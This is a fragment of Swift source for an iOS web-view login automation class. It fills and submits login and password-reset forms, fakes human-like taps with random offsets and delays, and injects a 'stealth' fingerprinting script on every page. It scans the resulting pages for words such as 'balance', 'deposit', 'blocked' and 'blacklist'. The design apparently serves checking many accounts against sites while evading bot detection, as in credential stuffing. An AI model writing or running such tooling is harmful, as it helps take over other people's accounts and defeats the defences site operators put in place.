                        errorBannerText: nil,
                        smsNotificationDetected: false,
                        smsNotificationText: nil
                    )
                }
            }
        }

        return RapidPollResult(
            welcomeTextFound: welcomeFound,
            welcomeContext: welcomeContext,
            welcomeScreenshot: welcomeScreenshot,
            redirectedToHomepage: redirectedHome,
            finalURL: lastURL,
            finalPageContent: lastContent,
            navigationDetected: navDetected,
            anyContentChange: contentChanged,
            errorBannerDetected: false,
            errorBannerText: nil,
            smsNotificationDetected: false,
            smsNotificationText: nil
        )
    }

    func waitForNavigation(timeout: TimeInterval = 90) async -> Bool {
        let timeout = TimeoutResolver.resolveAutomationTimeout(timeout)
        let start = Date()
        let originalURL = webView?.url?.absoluteString ?? ""
        let originalBody = await executeJS("document.body ? document.body.innerText.substring(0, 200) : ''") ?? ""

        while Date().timeIntervalSince(start) < timeout {
            try? await Task.sleep(for: .milliseconds(750))

            let currentURL = webView?.url?.absoluteString ?? ""
            if currentURL != originalURL && !currentURL.isEmpty {
                try? await Task.sleep(for: .milliseconds(1500))
                return true
            }

            let bodyText = await executeJS("document.body ? document.body.innerText.substring(0, 500) : ''") ?? ""
            if bodyText != originalBody && bodyText.count > 30 {
                let bodyLower = bodyText.lowercased()
                let indicators = ["dashboard", "account", "balance", "deposit",
                                  "incorrect", "invalid", "wrong", "disabled", "blocked",
                                  "blacklist", "locked", "error", "failed", "try again"]
                for indicator in indicators {
                    if bodyLower.contains(indicator) {
                        try? await Task.sleep(for: .milliseconds(1000))
                        return true
                    }
                }
            }
        }
        return false
    }

    func getPageContent() async -> String {
        await executeJS("document.body ? document.body.innerText.substring(0, 3000) : ''") ?? ""
    }

    func getPageTitle() async -> String {
        await executeJS("document.title") ?? "Unknown"
    }

    func getCurrentURL() async -> String {
        webView?.url?.absoluteString ?? "N/A"
    }

    func captureScreenshot() async -> UIImage? {
        guard let webView else { return nil }
        guard webView.bounds.width > 0, webView.bounds.height > 0 else { return nil }
        guard !isWebViewProcessTerminated(webView) else { return nil }
        return await RenderStableScreenshotService.shared.captureStableScreenshot(from: webView)
    }

    func captureScreenshotFast() async -> UIImage? {
        guard let webView else { return nil }
        guard webView.bounds.width > 0, webView.bounds.height > 0 else { return nil }
        guard !isWebViewProcessTerminated(webView) else { return nil }
        let config = WKSnapshotConfiguration()
        config.rect = webView.bounds
        do {
            return try await webView.takeSnapshot(configuration: config)
        } catch {
            logger.log("LoginSiteWebSession: captureScreenshotFast failed: \(error.localizedDescription)", category: .screenshot, level: .debug)
            return nil
        }
    }

    private func isWebViewProcessTerminated(_ wv: WKWebView) -> Bool {
        if wv.url == nil && !wv.isLoading && isPageLoaded {
            return true
        }
        return false
    }

    func fillForgotPasswordEmail(_ email: String) async -> (success: Bool, detail: String) {
        let strategies = """
        [
            {"type":"id","value":"email"},{"type":"id","value":"forgot-email"},
            {"type":"name","value":"email"},{"type":"name","value":"forgot_email"},
            {"type":"placeholder","value":"Email"},{"type":"placeholder","value":"email"},
            {"type":"placeholder","value":"Enter your email"},
            {"type":"css","value":"input[type='email']"},{"type":"css","value":"input[type='text']"},
            {"type":"label","value":"email"},{"type":"ariaLabel","value":"email"}
        ]
        """
        let result = await executeJS(fillFieldJS(strategies: strategies, value: email))
        return classifyFillResult(result, fieldName: "Forgot Password Email")
    }

    func clickForgotPasswordSubmit() async -> (success: Bool, detail: String) {
        let humanDelay = Int.random(in: 80...250)
        try? await Task.sleep(for: .milliseconds(humanDelay))

        let focusJS = """
        (function() {
            var emailField = document.querySelector('input[type="email"]') || document.querySelector('input[type="text"]');
            if (emailField) {
                emailField.dispatchEvent(new Event('blur', {bubbles: true}));
            }
            return emailField ? 'BLURRED' : 'NO_FIELD';
        })();
        """
        _ = await executeJS(focusJS)
        try? await Task.sleep(for: .milliseconds(Int.random(in: 100...300)))

        let strategyJS = """
        (function() {
            function humanClick(el) {
                if (!el) return false;
                try {
                    var rect = el.getBoundingClientRect();
                    var cx = rect.left + rect.width * (0.3 + Math.random() * 0.4);
                    var cy = rect.top + rect.height * (0.3 + Math.random() * 0.4);
                    el.scrollIntoView({behavior: 'smooth', block: 'center'});
                    el.focus();
                    el.dispatchEvent(new PointerEvent('pointerdown', {bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy,pointerId:1,pointerType:'touch'}));
                    el.dispatchEvent(new MouseEvent('mousedown', {bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy}));
                    el.dispatchEvent(new PointerEvent('pointerup', {bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy,pointerId:1,pointerType:'touch'}));
                    el.dispatchEvent(new MouseEvent('mouseup', {bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy}));
                    el.dispatchEvent(new MouseEvent('click', {bubbles:true,cancelable:true,view:window,clientX:cx,clientY:cy}));
                    el.click();
                    return true;
                } catch(e) { return false; }
            }

            var sendTerms = ['send', 'submit', 'reset', 'recover', 'request', 'continue', 'get link', 'email me', 'enviar'];
            var allClickables = document.querySelectorAll('button, input[type="submit"], a.btn, [role="button"], a[class*="btn"], span[class*="btn"], div[class*="btn"]');

            for (var i = 0; i < allClickables.length; i++) {
                var text = (allClickables[i].textContent || allClickables[i].value || '').toLowerCase().trim();
                for (var t = 0; t < sendTerms.length; t++) {
                    if (text.indexOf(sendTerms[t]) !== -1) {
                        if (humanClick(allClickables[i])) return 'HUMAN_CLICK_TEXT:' + text;
                    }
                }
            }

            var submitBtn = document.querySelector('button[type="submit"]');
            if (submitBtn && humanClick(submitBtn)) return 'HUMAN_CLICK_SUBMIT_BTN';

            var submitInput = document.querySelector('input[type="submit"]');
            if (submitInput && humanClick(submitInput)) return 'HUMAN_CLICK_SUBMIT_INPUT';

            var forms = document.querySelectorAll('form');
            for (var f = 0; f < forms.length; f++) {
                var hasEmail = forms[f].querySelector('input[type="email"]') || forms[f].querySelector('input[type="text"]');
                if (hasEmail) {
                    var formBtn = forms[f].querySelector('button') || forms[f].querySelector('input[type="submit"]');
                    if (formBtn && humanClick(formBtn)) return 'HUMAN_CLICK_FORM_BTN';
                }
            }

            return 'NOT_FOUND';
        })();
        """
        var result = await executeJS(strategyJS)
        if let result, result != "NOT_FOUND" {
            return (true, "Submit clicked via: \(result)")
        }

        try? await Task.sleep(for: .milliseconds(Int.random(in: 150...350)))

        let enterJS = """
        (function() {
            var emailField = document.querySelector('input[type="email"]') || document.querySelector('input[type="text"]');
            if (emailField) {
                emailField.focus();
                emailField.dispatchEvent(new KeyboardEvent('keydown', {key:'Enter',code:'Enter',keyCode:13,which:13,bubbles:true,cancelable:true}));
                emailField.dispatchEvent(new KeyboardEvent('keypress', {key:'Enter',code:'Enter',keyCode:13,which:13,bubbles:true,cancelable:true}));
                emailField.dispatchEvent(new KeyboardEvent('keyup', {key:'Enter',code:'Enter',keyCode:13,which:13,bubbles:true}));
                return 'ENTER_ON_EMAIL';
            }
            return 'NOT_FOUND';
        })();
        """
        result = await executeJS(enterJS)
        if let result, result != "NOT_FOUND" {
            return (true, "Submit via: \(result)")
        }

        let formSubmitJS = """
        (function() {
            var forms = document.querySelectorAll('form');
            for (var i = 0; i < forms.length; i++) {
                var hasInput = forms[i].querySelector('input[type="email"]') || forms[i].querySelector('input[type="text"]');
                if (hasInput) { forms[i].submit(); return 'FORM_SUBMIT_DIRECT'; }
            }
            if (forms.length > 0) { forms[0].submit(); return 'FIRST_FORM_SUBMIT'; }
            return 'NOT_FOUND';
        })();
        """
        result = await executeJS(formSubmitJS)
        if let result, result != "NOT_FOUND" {
            return (true, "Submit via: \(result)")
        }

        return (false, "Submit button not found after all strategies")
    }

    func checkLoginButtonReadiness() async -> (isReady: Bool, opacity: Double, detail: String) {
        let js = """
        (function() {
            var btns = document.querySelectorAll('button, input[type="submit"], a.btn, [role="button"]');
            for (var i = 0; i < btns.length; i++) {
                var text = (btns[i].textContent || btns[i].value || '').toLowerCase().trim();
                if (text === 'log in' || text === 'login' || text === 'sign in' || text === 'signin') {
                    var style = window.getComputedStyle(btns[i]);
                    var opacity = parseFloat(style.opacity);
                    var pointerEvents = style.pointerEvents;
                    var disabled = btns[i].disabled;
                    var bgColor = style.backgroundColor;
                    var cursor = style.cursor;
                    return JSON.stringify({
                        opacity: opacity,
                        pointerEvents: pointerEvents,
                        disabled: disabled,
                        bgColor: bgColor,
                        cursor: cursor,
                        text: text
                    });
                }
            }
            return 'NOT_FOUND';
        })();
        """
        guard let result = await executeJS(js), result != "NOT_FOUND",
              let data = result.data(using: .utf8),
              let json = try? JSONSerialization.jsonObject(with: data) as? [String: Any] else {
            return (false, 0, "Login button not found")
        }

        let opacity = json["opacity"] as? Double ?? 1.0
        let disabled = json["disabled"] as? Bool ?? false
        let pointerEvents = json["pointerEvents"] as? String ?? "auto"

        let isReady = opacity > 0.8 && !disabled && pointerEvents != "none"
        let detail = "opacity:\(String(format: "%.2f", opacity)) disabled:\(disabled) pointer:\(pointerEvents)"
        return (isReady, opacity, detail)
    }

    func dumpPageStructure() async -> String {
        let js = """
        (function() {
            var info = {};
            info.title = document.title;
            info.url = window.location.href;
            info.readyState = document.readyState;
            var inputs = document.querySelectorAll('input, select, textarea');
            info.inputCount = inputs.length;
            info.inputs = [];
            for (var i = 0; i < Math.min(inputs.length, 20); i++) {
                var inp = inputs[i];
                info.inputs.push({tag: inp.tagName, type: inp.type || '', id: inp.id || '', name: inp.name || '', placeholder: inp.placeholder || ''});
            }
            var buttons = document.querySelectorAll('button, input[type="submit"], [role="button"]');
            info.buttonCount = buttons.length;
            var bodyText = (document.body ? document.body.innerText : '').substring(0, 500);
            info.bodyPreview = bodyText;
            return JSON.stringify(info);
        })();
        """
        return await executeJS(js) ?? "{}"
    }

    func executeHumanPattern(
        _ pattern: LoginFormPattern,
        username: String,
        password: String,
        sessionId: String
    ) async -> HumanPatternResult {
        let engine = HumanInteractionEngine.shared
        return await engine.executePattern(
            pattern,
            username: username,
            password: password,
            executeJS: { [weak self] js in
                await self?.executeJS(js)
            },
            sessionId: sessionId
        )
    }

    func getWebView() -> WKWebView? {
        let mirror = Mirror(reflecting: self)
        for child in mirror.children {
            if let label = child.label, label == "webView", let wv = child.value as? WKWebView {
                return wv
            }
        }
        return nil
    }

    private func classifyFillResult(_ result: String?, fieldName: String) -> (success: Bool, detail: String) {
        switch result {
        case "OK":
            return (true, "\(fieldName) filled successfully")
        case "VALUE_MISMATCH":
            return (true, "\(fieldName) filled but value verification mismatch")
        case "NOT_FOUND":
            return (false, "\(fieldName) selector NOT_FOUND")
        case nil:
            return (false, "\(fieldName) JS execution returned nil")
        default:
            return (false, "\(fieldName) unexpected result: '\(result ?? "")'")
        }
    }

    func executeJS(_ js: String) async -> String? {
        guard let webView else { return nil }
        do {
            let result = try await webView.evaluateJavaScript(js)
            if let sid = monitoringSessionId {
                SessionActivityMonitor.shared.recordJSResponse(sessionId: sid)
            }
            if let str = result as? String { return str }
            if let num = result as? NSNumber { return "\(num)" }
            return nil
        } catch {
            logger.log("LoginSiteWebSession: JS evaluation failed: \(error.localizedDescription)", category: .login, level: .debug)
            return nil
        }
    }

    func getViewportSize() -> CGSize {
        webView?.frame.size ?? CGSize(width: 390, height: 844)
    }

    func injectSettlementMonitor() async {
        let settlement = SmartPageSettlementService.shared
        await settlement.injectMonitor(executeJS: { [weak self] js in
            await self?.executeJS(js)
        })
    }

    func waitForSmartSettlement(host: String, sessionId: String, maxTimeoutMs: Int = 15000) async -> SmartPageSettlementService.SettlementResult {
        let settlement = SmartPageSettlementService.shared
        return await settlement.waitForSettlement(
            executeJS: { [weak self] js in await self?.executeJS(js) },
            host: host,
            sessionId: sessionId,
            maxTimeoutMs: maxTimeoutMs
        )
    }

    func captureButtonFingerprint(sessionId: String) async -> SmartButtonRecoveryService.ButtonFingerprint? {
        let recovery = SmartButtonRecoveryService.shared
        return await recovery.captureFingerprint(
            executeJS: { [weak self] js in await self?.executeJS(js) },
            sessionId: sessionId
        )
    }

    func waitForSmartButtonRecovery(originalFingerprint: SmartButtonRecoveryService.ButtonFingerprint, host: String, sessionId: String, maxTimeoutMs: Int = 12000) async -> SmartButtonRecoveryService.RecoveryResult {
        let recovery = SmartButtonRecoveryService.shared
        return await recovery.waitForRecovery(
            originalFingerprint: originalFingerprint,
            executeJS: { [weak self] js in await self?.executeJS(js) },
            host: host,
            sessionId: sessionId,
            maxTimeoutMs: maxTimeoutMs
        )
    }

    func waitForFullPageReadiness(host: String, sessionId: String, maxTimeoutMs: Int = 30000) async -> PageReadinessService.ReadinessResult {
        let readiness = PageReadinessService.shared
        return await readiness.waitForFullPageReadiness(
            executeJS: { [weak self] js in await self?.executeJS(js) },
            host: host,
            sessionId: sessionId,
            maxTimeoutMs: maxTimeoutMs
        )
    }

    func waitForButtonReadyForNextAttempt(originalFingerprint: SmartButtonRecoveryService.ButtonFingerprint?, host: String, sessionId: String, maxTimeoutMs: Int = 25000) async -> PageReadinessService.ButtonReadyResult {
        let readiness = PageReadinessService.shared
        return await readiness.waitForButtonReadyForNextAttempt(
            executeJS: { [weak self] js in await self?.executeJS(js) },
            originalFingerprint: originalFingerprint,
            host: host,
            sessionId: sessionId,
            maxTimeoutMs: maxTimeoutMs
        )
    }
}

extension LoginSiteWebSession: WKNavigationDelegate {
    nonisolated func webView(_ webView: WKWebView, didCommit navigation: WKNavigation!) {
        Task { @MainActor in
            if let sid = self.monitoringSessionId {
                SessionActivityMonitor.shared.recordNavigation(sessionId: sid)
            }
            if self.stealthEnabled, let profile = self.stealthProfile {
                let earlyJS = PPSRStealthService.shared.buildComprehensiveStealthJSPublic(profile: profile)
                _ = await self.executeJS(earlyJS)
                self.logger.log("LoginSiteWebSession: early stealth injection on didCommit", category: .stealth, level: .trace)
            }
        }
    }

    nonisolated func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
        Task { @MainActor in
            if let sid = self.monitoringSessionId {
                SessionActivityMonitor.shared.recordNavigation(sessionId: sid)
            }
            self.isPageLoaded = true
            self.resolvePageLoad(true)
        }
    }

    nonisolated func webView(_ webView: WKWebView, didFail navigation: WKNavigation!, withError error: Error) {
        Task { @MainActor in
            self.lastNavigationError = self.classifyNavigationError(error)
            self.resolvePageLoad(false)
        }
    }

    nonisolated func webView(_ webView: WKWebView, didFailProvisionalNavigation navigation: WKNavigation!, withError error: Error) {
        Task { @MainActor in
            self.lastNavigationError = self.classifyNavigationError(error)
            self.resolvePageLoad(false)
        }
    }

    nonisolated func webView(_ webView: WKWebView, decidePolicyFor navigationAction: WKNavigationAction, decisionHandler: @escaping (WKNavigationActionPolicy) -> Void) {
        Task { @MainActor in
            self.navigationCount += 1
            if let sid = self.monitoringSessionId {
                SessionActivityMonitor.shared.recordNavigation(sessionId: sid)
            }
        }
        decisionHandler(.allow)
    }

    nonisolated func webViewWebContentProcessDidTerminate(_ webView: WKWebView) {
        Task { @MainActor in
            self.processTerminated = true
            self.lastNavigationError = "WebKit content process terminated (crash)"
            self.logger.log("LoginSiteWebSession: WKWebView content process TERMINATED — controlled recovery needed", category: .webView, level: .critical)
            WebViewTracker.shared.reportProcessTermination()
            self.resolvePageLoad(false)
            self.onProcessTerminated?()
        }
    }

    nonisolated func webView(_ webView: WKWebView, decidePolicyFor navigationResponse: WKNavigationResponse, decisionHandler: @escaping (WKNavigationResponsePolicy) -> Void) {
        if let httpResponse = navigationResponse.response as? HTTPURLResponse {
            Task { @MainActor in
                self.lastHTTPStatusCode = httpResponse.statusCode
                if let sid = self.monitoringSessionId {
                    SessionActivityMonitor.shared.recordResourceLoad(sessionId: sid)
                }
            }
        }
        decisionHandler(.allow)
    }

    private func classifyNavigationError(_ error: Error) -> String {
        let nsError = error as NSError
        if nsError.domain == NSURLErrorDomain {
            switch nsError.code {
            case NSURLErrorNotConnectedToInternet: return "No internet connection"
            case NSURLErrorTimedOut: return "Connection timed out"
            case NSURLErrorCannotFindHost: return "DNS resolution failed"
            case NSURLErrorCannotConnectToHost: return "Cannot connect to server"
            case NSURLErrorNetworkConnectionLost: return "Network connection lost"
            case NSURLErrorDNSLookupFailed: return "DNS lookup failed"
            case NSURLErrorSecureConnectionFailed: return "SSL/TLS handshake failed"
            default: return "Network error (\(nsError.code)): \(nsError.localizedDescription)"
            }
        }
        if nsError.domain == "WebKitErrorDomain" {
            switch nsError.code {
            case 102: return "Frame load interrupted"
            case 101: return "Request cancelled"
            default: return "WebKit error (\(nsError.code)): \(nsError.localizedDescription)"
            }
        }
        return "Navigation error: \(error.localizedDescription)"
    }
}
